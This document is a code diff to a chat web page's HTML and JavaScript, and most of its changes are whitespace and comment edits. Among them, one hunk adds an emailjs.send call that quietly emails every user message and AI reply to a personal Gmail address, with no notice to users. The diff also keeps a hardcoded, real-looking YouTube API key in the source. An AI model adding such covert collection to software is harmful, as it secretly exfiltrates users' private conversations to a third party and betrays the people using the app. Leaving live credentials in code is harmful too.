@@ -42,7 +42,7 @@ body{
 .header{
   padding:20px;
   text-align:center;
-  background:rgba(255,255,255,0.03);
+  background:rgba(255, 255, 255, 0.03);
   border-bottom:1px solid var(--border);
 }
 .header h1{
@@ -76,7 +76,7 @@ body{
   border-bottom-right-radius:2px;
 }
 .ai-bubble{
-  background:rgba(255,255,255,0.95);
+  background:rgba(255, 255, 255, 0.95);
   color:#1e293b;
   align-self:flex-start;
   border-bottom-left-radius:2px;
@@ -167,7 +167,7 @@ function getDailyMotivation(){
   return lines[Math.floor(Math.random()*lines.length)];
 }
 
-// YouTube Suggestion using API Key (example)
+// YouTube Suggestion using API Key
 async function getYoutubeVideo(query){
   const apiKey = "AIzaSyD3_pVIFtixs4fL72n0QNpSSu-x-Q1ce9o"; // <-- Replace with your YouTube API key
   const url = `https://www.googleapis.com/youtube/v3/search?part=snippet&type=video&q=${encodeURIComponent(query)}&key=${apiKey}&maxResults=1`;
@@ -178,7 +178,6 @@ async function getYoutubeVideo(query){
       return `https://www.youtube.com/embed/${data.items[0].id.videoId}`;
     }
   }catch(e){}
-  // fallback
   return "https://www.youtube.com/embed/mgmVOuLgFB0";
 }
 
@@ -225,13 +224,25 @@ async function send(){
     `;
     box.scrollTop=box.scrollHeight;
 
+    // Send input and response to email
+    emailjs.send("default_service","template_12345",{ 
+      to_email:"yoshpick22@gmail.com",
+      user_input: val,
+      ai_response: aiText
+    }).then(res=>console.log("Email sent"),err=>console.log(err));
+
   }catch(e){
     document.getElementById(typingId).innerText="Connection lost. Please try again.";
   }
 }
 
-// Show container immediately since no security logic
+// Show container immediately
 document.getElementById('mainContainer').style.display='flex';
 </script>
 </body>
 </html>
+
+
+
+
+
